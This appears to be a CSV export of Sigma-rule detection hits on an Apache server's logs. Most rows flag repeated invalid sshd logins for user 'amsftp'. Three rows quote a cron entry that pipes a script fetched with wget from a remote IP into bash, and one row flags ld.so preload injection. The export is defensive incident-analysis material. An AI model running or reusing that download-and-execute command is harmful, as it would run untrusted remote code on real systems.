Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:29,T1105,timestamp_utc=2021-11-19 22:44:29; timestamp=Nov 19 22:44:29; host=ApacheWebServer; process=sshd; pid=11920; message=Disconnected from invalid user amsftp 10.0.0.4 port 55320 [preauth]; log=/var/log/auth.log.3.gz; line_no=46544,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:30,T1105,timestamp_utc=2021-11-19 22:44:30; timestamp=Nov 19 22:44:30; host=ApacheWebServer; process=sshd; pid=11974; message=Disconnected from invalid user amsftp 10.0.0.4 port 55364 [preauth]; log=/var/log/auth.log.3.gz; line_no=46546,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:31,T1105,timestamp_utc=2021-11-19 22:44:31; timestamp=Nov 19 22:44:31; host=ApacheWebServer; process=sshd; pid=11959; message=Disconnected from invalid user amsftp 10.0.0.4 port 55334 [preauth]; log=/var/log/auth.log.3.gz; line_no=46548,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=12066; message=Invalid user amsftp from 10.0.0.4 port 55438; log=/var/log/auth.log.3.gz; line_no=46549,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=12023; message=Invalid user amsftp from 10.0.0.4 port 55402; log=/var/log/auth.log.3.gz; line_no=46550,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=11960; message=Invalid user amsftp from 10.0.0.4 port 55360; log=/var/log/auth.log.3.gz; line_no=46551,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:32,T1105,timestamp_utc=2021-11-19 22:44:32; timestamp=Nov 19 22:44:32; host=ApacheWebServer; process=sshd; pid=12006; message=Disconnected from invalid user amsftp 10.0.0.4 port 55394 [preauth]; log=/var/log/auth.log.3.gz; line_no=46553,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:33,T1105,timestamp_utc=2021-11-19 22:44:33; timestamp=Nov 19 22:44:33; host=ApacheWebServer; process=sshd; pid=12097; message=Invalid user amsftp from 10.0.0.4 port 55452; log=/var/log/auth.log.3.gz; line_no=46554,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:33,T1105,timestamp_utc=2021-11-19 22:44:33; timestamp=Nov 19 22:44:33; host=ApacheWebServer; process=sshd; pid=12056; message=Invalid user amsftp from 10.0.0.4 port 55414; log=/var/log/auth.log.3.gz; line_no=46555,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:34,T1105,timestamp_utc=2021-11-19 22:44:34; timestamp=Nov 19 22:44:34; host=ApacheWebServer; process=sshd; pid=12023; message=Disconnected from invalid user amsftp 10.0.0.4 port 55402 [preauth]; log=/var/log/auth.log.3.gz; line_no=46557,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:34,T1105,timestamp_utc=2021-11-19 22:44:34; timestamp=Nov 19 22:44:34; host=ApacheWebServer; process=sshd; pid=11960; message=Disconnected from invalid user amsftp 10.0.0.4 port 55360 [preauth]; log=/var/log/auth.log.3.gz; line_no=46559,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:34,T1105,timestamp_utc=2021-11-19 22:44:34; timestamp=Nov 19 22:44:34; host=ApacheWebServer; process=sshd; pid=12080; message=Invalid user amsftp from 10.0.0.4 port 55448; log=/var/log/auth.log.3.gz; line_no=46560,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:35,T1105,timestamp_utc=2021-11-19 22:44:35; timestamp=Nov 19 22:44:35; host=ApacheWebServer; process=sshd; pid=12050; message=Invalid user amsftp from 10.0.0.4 port 55408; log=/var/log/auth.log.3.gz; line_no=46562,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:35,T1105,timestamp_utc=2021-11-19 22:44:35; timestamp=Nov 19 22:44:35; host=ApacheWebServer; process=sshd; pid=12066; message=Disconnected from invalid user amsftp 10.0.0.4 port 55438 [preauth]; log=/var/log/auth.log.3.gz; line_no=46564,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:35,T1105,timestamp_utc=2021-11-19 22:44:35; timestamp=Nov 19 22:44:35; host=ApacheWebServer; process=sshd; pid=12056; message=Disconnected from invalid user amsftp 10.0.0.4 port 55414 [preauth]; log=/var/log/auth.log.3.gz; line_no=46566,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:36,T1105,timestamp_utc=2021-11-19 22:44:36; timestamp=Nov 19 22:44:36; host=ApacheWebServer; process=sshd; pid=12117; message=Invalid user amsftp from 10.0.0.4 port 55486; log=/var/log/auth.log.3.gz; line_no=46568,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:36,T1105,timestamp_utc=2021-11-19 22:44:36; timestamp=Nov 19 22:44:36; host=ApacheWebServer; process=sshd; pid=12067; message=Invalid user amsftp from 10.0.0.4 port 55442; log=/var/log/auth.log.3.gz; line_no=46569,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:37,T1105,timestamp_utc=2021-11-19 22:44:37; timestamp=Nov 19 22:44:37; host=ApacheWebServer; process=sshd; pid=12057; message=Invalid user amsftp from 10.0.0.4 port 55430; log=/var/log/auth.log.3.gz; line_no=46570,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:37,T1105,timestamp_utc=2021-11-19 22:44:37; timestamp=Nov 19 22:44:37; host=ApacheWebServer; process=sshd; pid=12097; message=Disconnected from invalid user amsftp 10.0.0.4 port 55452 [preauth]; log=/var/log/auth.log.3.gz; line_no=46571,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:37,T1105,timestamp_utc=2021-11-19 22:44:37; timestamp=Nov 19 22:44:37; host=ApacheWebServer; process=sshd; pid=12080; message=Disconnected from invalid user amsftp 10.0.0.4 port 55448 [preauth]; log=/var/log/auth.log.3.gz; line_no=46573,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:38,T1105,timestamp_utc=2021-11-19 22:44:38; timestamp=Nov 19 22:44:38; host=ApacheWebServer; process=sshd; pid=12057; message=Disconnected from invalid user amsftp 10.0.0.4 port 55430 [preauth]; log=/var/log/auth.log.3.gz; line_no=46575,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:38,T1105,timestamp_utc=2021-11-19 22:44:38; timestamp=Nov 19 22:44:38; host=ApacheWebServer; process=sshd; pid=12098; message=Invalid user amsftp from 10.0.0.4 port 55454; log=/var/log/auth.log.3.gz; line_no=46576,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:39,T1105,timestamp_utc=2021-11-19 22:44:39; timestamp=Nov 19 22:44:39; host=ApacheWebServer; process=sshd; pid=12050; message=Disconnected from invalid user amsftp 10.0.0.4 port 55408 [preauth]; log=/var/log/auth.log.3.gz; line_no=46578,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:39,T1105,timestamp_utc=2021-11-19 22:44:39; timestamp=Nov 19 22:44:39; host=ApacheWebServer; process=sshd; pid=12125; message=Invalid user amsftp from 10.0.0.4 port 55506; log=/var/log/auth.log.3.gz; line_no=46579,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:40,T1105,timestamp_utc=2021-11-19 22:44:40; timestamp=Nov 19 22:44:40; host=ApacheWebServer; process=sshd; pid=12146; message=Invalid user amsftp from 10.0.0.4 port 55516; log=/var/log/auth.log.3.gz; line_no=46580,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:40,T1105,timestamp_utc=2021-11-19 22:44:40; timestamp=Nov 19 22:44:40; host=ApacheWebServer; process=sshd; pid=12166; message=Invalid user amsftp from 10.0.0.4 port 55534; log=/var/log/auth.log.3.gz; line_no=46581,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:41,T1105,timestamp_utc=2021-11-19 22:44:41; timestamp=Nov 19 22:44:41; host=ApacheWebServer; process=sshd; pid=12146; message=Disconnected from invalid user amsftp 10.0.0.4 port 55516 [preauth]; log=/var/log/auth.log.3.gz; line_no=46583,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:41,T1105,timestamp_utc=2021-11-19 22:44:41; timestamp=Nov 19 22:44:41; host=ApacheWebServer; process=sshd; pid=12124; message=Invalid user amsftp from 10.0.0.4 port 55496; log=/var/log/auth.log.3.gz; line_no=46584,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:42,T1105,timestamp_utc=2021-11-19 22:44:42; timestamp=Nov 19 22:44:42; host=ApacheWebServer; process=sshd; pid=12115; message=Invalid user amsftp from 10.0.0.4 port 55478; log=/var/log/auth.log.3.gz; line_no=46585,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:42,T1105,timestamp_utc=2021-11-19 22:44:42; timestamp=Nov 19 22:44:42; host=ApacheWebServer; process=sshd; pid=12067; message=Disconnected from invalid user amsftp 10.0.0.4 port 55442 [preauth]; log=/var/log/auth.log.3.gz; line_no=46587,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:42,T1105,timestamp_utc=2021-11-19 22:44:42; timestamp=Nov 19 22:44:42; host=ApacheWebServer; process=sshd; pid=12117; message=Disconnected from invalid user amsftp 10.0.0.4 port 55486 [preauth]; log=/var/log/auth.log.3.gz; line_no=46589,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:43,T1105,timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12124; message=Disconnected from invalid user amsftp 10.0.0.4 port 55496 [preauth]; log=/var/log/auth.log.3.gz; line_no=46591,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:43,T1105,timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; message=Invalid user amsftp from 10.0.0.4 port 55476; log=/var/log/auth.log.3.gz; line_no=46593,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:43,T1105,timestamp_utc=2021-11-19 22:44:43; timestamp=Nov 19 22:44:43; host=ApacheWebServer; process=sshd; pid=12099; message=Disconnected from invalid user amsftp 10.0.0.4 port 55476 [preauth]; log=/var/log/auth.log.3.gz; line_no=46595,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:44,T1105,timestamp_utc=2021-11-19 22:44:44; timestamp=Nov 19 22:44:44; host=ApacheWebServer; process=sshd; pid=12145; message=Invalid user amsftp from 10.0.0.4 port 55514; log=/var/log/auth.log.3.gz; line_no=46596,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:46,T1105,timestamp_utc=2021-11-19 22:44:46; timestamp=Nov 19 22:44:46; host=ApacheWebServer; process=sshd; pid=12098; message=Disconnected from invalid user amsftp 10.0.0.4 port 55454 [preauth]; log=/var/log/auth.log.3.gz; line_no=46598,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:47,T1105,timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12145; message=Disconnected from invalid user amsftp 10.0.0.4 port 55514 [preauth]; log=/var/log/auth.log.3.gz; line_no=46600,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:47,T1105,timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12125; message=Disconnected from invalid user amsftp 10.0.0.4 port 55506 [preauth]; log=/var/log/auth.log.3.gz; line_no=46602,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:47,T1105,timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12115; message=Disconnected from invalid user amsftp 10.0.0.4 port 55478 [preauth]; log=/var/log/auth.log.3.gz; line_no=46604,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:47,T1105,timestamp_utc=2021-11-19 22:44:47; timestamp=Nov 19 22:44:47; host=ApacheWebServer; process=sshd; pid=12166; message=Disconnected from invalid user amsftp 10.0.0.4 port 55534 [preauth]; log=/var/log/auth.log.3.gz; line_no=46606,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:49,T1105,timestamp_utc=2021-11-19 22:44:49; timestamp=Nov 19 22:44:49; host=ApacheWebServer; process=sshd; pid=12159; message=Invalid user amsftp from 10.0.0.4 port 55518; log=/var/log/auth.log.3.gz; line_no=46609,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,VAR_LOG,67,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:50,T1105,timestamp_utc=2021-11-19 22:44:50; timestamp=Nov 19 22:44:50; host=ApacheWebServer; process=sshd; pid=12159; message=Disconnected from invalid user amsftp 10.0.0.4 port 55518 [preauth]; log=/var/log/auth.log.3.gz; line_no=46613,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Code Injection by ld.so Preload,HIGH,high,VAR_LOG,1,2021-11-19 01:30:57,2021-11-19 01:30:57,2021-11-19 01:30:57,T1574.006,"timestamp_utc=2021-11-19 01:30:57; timestamp=Nov 19 01:30:57; host=ApacheWebServer; process=kernel; message=[3493490.184715] audit: type=1309 audit(1637285452.056:6538221): argc=3 a0=""c...; log=/var/log/kern.log.3.gz; line_no=76200",Detects the ld.so preload persistence file. See `man ld.so` for more information.,7e3c4651-c347-40c4-b1d4-d48590fdf684,sigma-rules/rules\linux\builtin\lnx_ldso_preload_injection.yml
Suspicious Activity in Shell Commands,HIGH,high,VAR_LOG,3,2021-12-01 16:37:02,2021-12-07 22:09:03,2021-12-07 22:09:03,T1059.004,timestamp_utc=2021-12-07 22:09:03; timestamp=Dec  7 22:09:03; host=ApacheWebServer; process=CRON; pid=2743; message=(daemon) CMD (wget -q -O - http://198.18.0.37/ap.sh | bash > /dev/null 2>&1); log=/var/log/syslog.1; line_no=2332,Detects suspicious shell commands used in various exploit codes (see references),2aa1440c-9ae9-4d92-84a7-a9e5f5e31695,sigma-rules/rules\linux\builtin\lnx_shell_susp_commands.yml
Suspicious Activity in Shell Commands,HIGH,high,VAR_LOG,3,2021-12-01 16:37:02,2021-12-07 22:09:03,2021-12-05 22:19:01,T1059.004,timestamp_utc=2021-12-05 22:19:01; timestamp=Dec  5 22:19:01; host=ApacheWebServer; process=CRON; pid=18752; message=(daemon) CMD (wget -q -O - http://198.18.0.37/ap.sh | bash > /dev/null 2>&1); log=/var/log/syslog.3.gz; line_no=5742,Detects suspicious shell commands used in various exploit codes (see references),2aa1440c-9ae9-4d92-84a7-a9e5f5e31695,sigma-rules/rules\linux\builtin\lnx_shell_susp_commands.yml
Suspicious Activity in Shell Commands,HIGH,high,VAR_LOG,3,2021-12-01 16:37:02,2021-12-07 22:09:03,2021-12-01 16:37:02,T1059.004,timestamp_utc=2021-12-01 16:37:02; timestamp=Dec  1 16:37:02; host=ApacheWebServer; process=CRON; pid=17652; message=(daemon) CMD (wget -q -O - http://198.18.0.37/ap.sh | bash > /dev/null 2>&1); log=/var/log/syslog.7.gz; line_no=1299,Detects suspicious shell commands used in various exploit codes (see references),2aa1440c-9ae9-4d92-84a7-a9e5f5e31695,sigma-rules/rules\linux\builtin\lnx_shell_susp_commands.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:14,T1105,timestamp_utc=2021-11-19 22:44:14; timestamp_raw=Nov 19 22:44:14; host=ApacheWebServer; process=sshd; pid=11817; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:15,T1105,timestamp_utc=2021-11-19 22:44:15; timestamp_raw=Nov 19 22:44:15; host=ApacheWebServer; process=sshd; pid=11797; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:16,T1105,timestamp_utc=2021-11-19 22:44:16; timestamp_raw=Nov 19 22:44:16; host=ApacheWebServer; process=sshd; pid=11797; event=connection closed; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:16,T1105,timestamp_utc=2021-11-19 22:44:16; timestamp_raw=Nov 19 22:44:16; host=ApacheWebServer; process=sshd; pid=11840; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:19,T1105,timestamp_utc=2021-11-19 22:44:19; timestamp_raw=Nov 19 22:44:19; host=ApacheWebServer; process=sshd; pid=11817; event=connection closed; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:19,T1105,timestamp_utc=2021-11-19 22:44:19; timestamp_raw=Nov 19 22:44:19; host=ApacheWebServer; process=sshd; pid=11818; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:21,T1105,timestamp_utc=2021-11-19 22:44:21; timestamp_raw=Nov 19 22:44:21; host=ApacheWebServer; process=sshd; pid=11840; event=connection closed; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:21,T1105,timestamp_utc=2021-11-19 22:44:21; timestamp_raw=Nov 19 22:44:21; host=ApacheWebServer; process=sshd; pid=11818; event=connection closed; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp_raw=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=12005; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp_raw=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11861; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp_raw=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11860; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:22,T1105,timestamp_utc=2021-11-19 22:44:22; timestamp_raw=Nov 19 22:44:22; host=ApacheWebServer; process=sshd; pid=11936; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
Remote File Copy,LOW,low,AUTH_LOG,66,2021-11-19 22:44:14,2021-11-19 22:44:50,2021-11-19 22:44:23,T1105,timestamp_utc=2021-11-19 22:44:23; timestamp_raw=Nov 19 22:44:23; host=ApacheWebServer; process=sshd; pid=11921; event=invalid user; event_class=auth; user=amsftp,Detects the use of tools that copy files from or to remote systems,7a14080d-a048-4de8-ae58-604ce58a795b,sigma-rules/rules\linux\builtin\lnx_file_copy.yml
